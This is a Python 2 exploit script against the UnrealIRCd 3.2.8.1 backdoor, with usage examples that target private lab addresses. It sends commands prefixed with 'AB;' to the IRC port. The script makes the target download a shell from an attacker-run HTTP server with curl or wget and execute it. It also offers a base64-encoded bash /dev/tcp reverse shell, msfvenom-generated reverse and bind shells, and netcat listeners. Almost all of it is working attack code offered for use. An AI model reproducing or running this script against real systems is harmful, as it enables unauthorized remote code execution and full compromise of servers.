import subprocess
import argparse
import signal
import os
import random
import socket
import SimpleHTTPServer
import SocketServer
import time
import threading
import sys

#--------------------------------------------------------------------------------------Examples-----------------------------------------------------------------------------------------#

#Basic example
#python2 IRC-exploit_1.0.py 172.31.206.68 6697 --LPORT 8002 --LHOST 172.31.157.26

#Using a custom reverse shell, remote HTTP server, remote Netcat listener and setting shell arch to x64.
#python2 IRC-exploit_1.0.py 172.31.206.68 6697 --ServIP 172.31.157.26 --ServPORT 8002 --LPORT 8022 --arch x64 --LHOST 172.31.157.26 --custm_shll lolies --rShellname clean --RemoteHTTPServ --RemoteNcLis

#Using a custom bind shell, remote HTTP server, remote Netcat listener and setting shell arch to x64.
#python2 IRC-exploit_1.0.py 172.31.206.68 6697 --ServIP 172.31.157.26 --ServPORT 8002 --LPORT 8022 --custm_shll lol --rShellname cleaner --RemoteHTTPServ --bind_shll --RemoteNcLis

#Using a bash shell oneliner.
#python2 IRC-exploit_1.0.py 172.31.206.68 6697 --LPORT 8002  --LHOST 172.31.157.26 --bash_rev

#Using a bash shell oneliner with remote Netcat listener.
#python2 IRC-exploit_1.0.py 172.31.206.68 6697  --LPORT 8022 --LHOST 172.31.157.26 --bash_rev --RemoteNcLis

#Test if vulnerable to exploit with:
#python2 IRC-exploit_1.0.py 172.31.206.68 6697 --cmd 'ping -c 2 172.31.157.26'
#sudo tcpdump -i eth0 icmp and icmp[icmptype]=icmp-echo


args = dict()
parser = argparse.ArgumentParser(usage='\nPython 2.7 script to exploit UnrealIRCd 3.2.8.1 RCE vulnerabilty\nBy default the script requires RHOST, RPORT, LHOST and LPORT. It then creates a reverse shell, starts an HTTP server,\nmakes the RHOST download the shell from the HTTP server, starts a Netcat listener on LHOST and makes RHOST execute the shell.\nIf the exploit is succesfull it will create a remote shell session on target using the Unreal IRCD user.\n\nScript supports the use of remote HTTP servers, Netcat listeners and other options, see -h\n\nCan also test if target is vulnerable to exploit by using the --cmd flag.\n')

#Function to parse command line arguments.
def parse_args():

        exit = False

        global parser
        global args

        # Mandatory arguments
        parser.add_argument('RHOST', type=str, help='IP of the target.')
        parser.add_argument('RPORT', type=int, help='Port number of Unreal IRCD service on traget.')

        # Optional arguments
        parser.add_argument('--LHOST', nargs='?', type=str, help='The IP of the host the reverse shell connects back to, it does not need to be localhost. Mandatory except when using cmd or bind shell flag.')
        parser.add_argument('--LPORT', nargs='?', type=int, help='The Port the reverse shell connects back to, if using bind shell it\'s the bind port at the target.')
        parser.add_argument('--bash_rev', action='store_true', help='Flag to use a onliner bash reverse shell.')
        parser.add_argument('--bind_shll', action='store_true', help='Flag to use a bind shell instad of a reverse shell, will use LPORT as the bind port at the target(RHOST).')
        parser.add_argument('--RemoteHTTPServ', action='store_true', help='Flag must be set when the HTTP server is not on localhost, server must be started manually. If this flag is set, ServIP is mandatory.')
        parser.add_argument('--RemoteNcLis', action='store_true', help='Flag must be set if the Netcat listener is not on localhost, listener must be started manually.')
        parser.add_argument('--wget', action='store_true', help='Flag to use wget instead of curl when requesting the shell from the HTTP server. Use when target does not have curl.')
        parser.add_argument('--custm_shll', nargs='?', type=str, help='The name of a custom shell file, shell must be in the root path of the HTTP server (By default the dir of this script). If not provided it will default to the msfvenom shell generated in create_shell()')
        parser.add_argument('--arch', default='x86', type=str,  choices=['x86', 'x64'], help='The name of the shell\'s architecture, options are x86 or x64. Defaults to x86 if not included.')
        parser.add_argument('--ServIP', nargs='?', type=str, help='The IP of the HTTP server. If not provided it defaults to LHOST, if LHOST is not set to localhost the RemoteHTTPServ flag must be set for the script to work. Mandatory if using bind shell.')
        parser.add_argument('--ServPORT', nargs='?', type=int, help='The port of the HTTP server, if none is provided it defaults to a random value between 8000-8500.')
        parser.add_argument('--rShellname', default='shell', type=str, help='The filename of the shell at RHOST, defaults to "shell."')
        parser.add_argument('--cmd', nargs="?", type=str, help='RCE, usefull to test if vulnerable to exploit. If this flag is used all other options excpet RHOST and RPORT are ignored.')

        args = vars(parser.parse_args())

        # Checks on command line argument dependencies
        if ((args['LHOST'] is None or args['LPORT'] is None) and args['cmd'] is None):
                if (not (args['LHOST'] is None and args['bind_shll'])):
                        print("\nLHOST and LPORT are required except when using option --cmd.")
                        exit = True

        if (args['RemoteHTTPServ'] and (args['ServIP'] is None or args['ServPORT'] is None)):
                print ("\nServIP and ServPORT must be set when using the RemoteHTTPServ flag.")
                exit = True
        elif (args['bind_shll']  and args['LPORT'] is None ):
                print("\nBind shell option requires LPORT.")
                exit = True
        elif (args['bind_shll']  and args['LHOST'] is not None ):
                print("\nBind shell option does not require LHOST.")
                exit = True
        elif (args['bind_shll']  and args['ServIP'] is None ):
                print("\nBind shell option requires ServIP.")
                exit = True
        elif (args['bind_shll'] and args['bash_rev'] ):
                print("\nCan't have a bash reverse shell and a bind shell at the same time.")
                exit = True
        elif ((args['custm_shll'] is not None)  and args['bash_rev'] ):
                print("\nCan't use a custom shell for a reverse bash shell.")
                exit = True
        elif (args['bash_rev'] and  args['rShellname'] != 'shell' ):
                print("\nA reverse bash shell does not need rShellname flag")
                exit = True
        elif ((args['ServIP'] is not None or args['ServPORT'] is not None) and args['bash_rev']):
                print("\nThere is no need for an HTTP server when using a reverse bash shell.")
                exit = True

        #If ServIP not set, default to LHOST.
        if (args['ServIP'] is None ):
                args['ServIP'] = args['LHOST']

        #If not using a custm_shll set name to default shell name
        if (args['custm_shll'] is None ):
                args['custm_shll'] = 'defShellName'

        #Set random value for HTTP server port when not set and using a local server
        if (args['ServPORT'] is None and not args['RemoteHTTPServ'] ):
                args['ServPORT'] = random.randint(8000, 8500)

        if (exit):
                Left_Exit_12_Off_Ramp('exit')

# Exit function
def Left_Exit_12_Off_Ramp(reason):
        if (reason == 'exit' ):
                print ("\nExiting script, get your s__tuff together. Use the -h flag.\n")
                print (parser.print_help())
        elif (reason == 'msfvenom'):
                print ("\nDid not find msfvenom, create shell manually and use option --custm_shll.\n")
        elif (reason == 'cmd'):
                os.kill(os.getpid(),  signal.SIGTERM)
        elif (reason == 'kill'):
                print ("\nKilled process, either RHOST is not vulnerable or HTTP request from RHOST could not reach HTTP server.")
                print ("Test exploit with command: 'ping -c 2 LHOST-IP' and TCP dump.\n")
                os.kill(os.getpid(),  signal.SIGTERM)
        else:
                print ("\nFinished exploit succesfully, exiting script.")
        sys.exit()


# Connect to IRC on RHOST and send command in "payload"
def connect_IRCD(payload):
        try:
                print ("\nTrying to connect to Unreal IRCD service at " + args['RHOST'] + ":" + str(args['RPORT']))
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_address = (args['RHOST'], args['RPORT'])
                sock.settimeout(5)

                sock.connect(server_address)
                print ("Connected to " + args['RHOST'] + ":" + str(args['RPORT']))

                data = sock.recv(1024)
                print ("\nRecieved data:\n" + str(data))

                print ("Sending command: " +payload)
                sock.sendall("AB; " + payload + " &")

                print ("Succesfully sent command\n")

        except Exception, e:
                print ("Could not send command to RHOST: " + str(e))
                Left_Exit_12_Off_Ramp('cmd')

        finally:
                sock.close()

# Start HTTP server on host running script.
def start_server():
        print ("\nStarting HTTP server")

        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
        httpd = SocketServer.TCPServer(("", args['ServPORT']), Handler)

        print ("Serving HTTP server at : " + args['ServIP']  + ':' + str(args['ServPORT']))

        httpd.handle_request()

# Send a shell file.
def file_shell():
        if (not args['RemoteHTTPServ']):
                t=threading.Thread(target=start_server)
                t.start()

        if ( not args['wget']):
                payld="curl http://" + args['ServIP']  + ":" + str(args['ServPORT']) + "/" + args['custm_shll'] + " -o /tmp/" + args['rShellname']
        else:
                payld="wget http://" + args['ServIP']  + ":" + str(args['ServPORT']) + "/" + args['custm_shll'] + " -O /tmp/" + args['rShellname']

        connect_IRCD(payld)

        time.sleep(5)

        if (not args['RemoteHTTPServ']):
                if t.is_alive():
                        Left_Exit_12_Off_Ramp('kill')
                else:
                        print ("\nExploit worked, remote server executed HTTP request.")
                        print ("Making shell executable and running shell")

        payld ="chmod +x /tmp/"  + args['rShellname'] + "; /tmp/" + args['rShellname']
        setup_nc(payld)

# Start netcat either to recieve reverse shell or connect to bind shell if --RemoteNCLis flag is not set. Also sends command to run shell (bash or reverse)
def setup_nc(payld):
        print
        if (not args['RemoteNcLis']):
                if ( not args['bind_shll']):
                        print("Setting up Netcat listener for reverse shell:")
                        p = subprocess.Popen('nc -nvlp ' + str(args['LPORT']),  shell=True)
                        time.sleep(1)

        t=threading.Thread(target=connect_IRCD, args=(payld,))
        t.start()

        if (not args['RemoteNcLis']):
                if (args['bind_shll']):
                        time.sleep(1)
                        print("Connecting to bind shell with Netcat.")
                        p = subprocess.Popen('nc -nv ' + args['RHOST'] + ' ' + str(args['LPORT']),  shell=True)


                print ("\nOnce shell is connected upgrade shell using python. Cmd: python -c 'import pty; pty.spawn(\"/bin/bash\")'")
                p.wait()


#  Setup reverse bash shell payload
def bash_reverse_shell():
        payld =  "echo '/bin/bash -l > /dev/tcp/{0}/{1} 0<&1 2>&1 &' | base64 -w0".format(args['LHOST'],args['LPORT'])
        process = subprocess.Popen(payld, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        stdout, stderr = process.communicate()
        payld ="echo " + stdout + " | base64 -d | /bin/bash"
        setup_nc(payld)


# Create a shell (bind or reverse)  using msfvenom
def create_shell():
        if ( not args['bind_shll']):
                print("Generating reverse shell, Arch:" + args['arch'] + " LHOST:" + args['LHOST'] + " LPORT:" + str(args['LPORT']) )
                process = subprocess.Popen('msfvenom -p linux/' + args['arch'] + '/shell_reverse_tcp LHOST=' + args['LHOST'] + ' LPORT='+str(args['LPORT'])+' -f elf > defShellName', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        else:
                print("Generating reverse shell, Arch:" + args['arch'] + " LPORT:" + str(args['LPORT']) )
                process = subprocess.Popen('msfvenom -p linux/' + args['arch'] + '/shell_bind_tcp LPORT=' + str(args['LPORT']) +' -f elf > defShellName', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

        stdout, stderr = process.communicate()

        if "msfvenom: not found" in stderr:
                Left_Exit_12_Off_Ramp('msfvenom')

        print ("Succesfully generated shell")


      #############################################################################################
      #                                                                                 _         #
      #       _                       __  __     _____     _____     __   _           (  ).       #
      #     (  ).            o O O   |  \/  |   /  _  \   |__ __|   |  \ | |         (     ')     #
      #    (  )  )          o        | |\/| |   | /_\ |    _| |_    | . \| |        (    ) )      #
      #    (      )        ][__[O]   |_|  |_|   |__|__|   |_____|   |_|\___|         `(__.:'      #
      #     `(__.:         {======|_|^^^^^^^^|_|^^^^^^^|_|^^^^^^^|_|^^^^^^^^|                     #
      #                    /o--000'"`-0-0-0-0'"`-0-0-0-'"`-0-0-0-'"`-0-0-0-0'                     #
      # ----------------------------------------------------------------------------------------- #
      #                                                                                           #
      #############################################################################################

#print
parse_args()
#print ("DEBUG: " + str(args))

if (args['custm_shll'] == 'defShellName' and  not args['bash_rev'] and args['cmd'] is None) :
        create_shell()

if  (args['cmd'] is None ):
        if  (args['bash_rev']):
                print ("Selected bash shell, will send bash shell command directly to target.")
                bash_reverse_shell()
        else:
                print ("Selected a file shell, target will make a GET request to HTTP server to download shell file first.")
                file_shell()
else:
        print ("Selected remote code execution, cmd output will not be received.")
        connect_IRCD(args['cmd'])

Left_Exit_12_Off_Ramp('finished')
